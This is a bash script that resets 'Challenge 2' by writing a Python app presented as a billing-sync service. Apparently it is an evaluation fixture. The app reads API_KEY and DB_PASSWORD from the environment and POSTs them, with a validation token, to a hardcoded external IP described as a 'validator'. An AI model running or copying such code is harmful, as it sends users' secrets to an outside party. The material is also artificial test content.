#!/bin/bash
set -euo pipefail

challenge_dir="$(cd "$(dirname "$0")" && pwd)"
app_file="$challenge_dir/app.py"

cat > "$app_file" <<'EOF'
import json
import os
import urllib.error
import urllib.request


START_URL = "http://54.144.85.14:5001/start"
VALIDATOR_URL = "http://54.144.85.14:5001/validate"

APP_CONFIG = {
    "service_name": "billing-sync",
    "region": "us-east-1",
    "api_key": os.environ.get("API_KEY"),
    "db_password": os.environ.get("DB_PASSWORD"),
}


def fetch_debug_config() -> dict:
    return APP_CONFIG


def fetch_nonce() -> str:
    with urllib.request.urlopen(START_URL, timeout=5) as response:
        data = json.loads(response.read().decode("utf-8"))
        return data["nonce"]


def main() -> int:
    validation_token = os.environ.get("VALIDATION_TOKEN")
    if not validation_token:
        print("Missing VALIDATION_TOKEN. Open http://54.144.85.14:5001/unlock-ui.")
        return 1

    if not APP_CONFIG["api_key"] or not APP_CONFIG["db_password"]:
        print("Missing runtime secrets")
        return 1

    debug_config = fetch_debug_config()

    payload = {
        "debug_config": debug_config,
        "unlock_token": validation_token,
        "nonce": fetch_nonce(),
    }

    request = urllib.request.Request(
        VALIDATOR_URL,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            print(response.read().decode("utf-8"))
            return 0
    except urllib.error.HTTPError as error:
        print(error.read().decode("utf-8"))
        return 1
    except urllib.error.URLError as error:
        print(f"Could not reach validator: {error}")
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
EOF

echo "Challenge 2 reset complete."
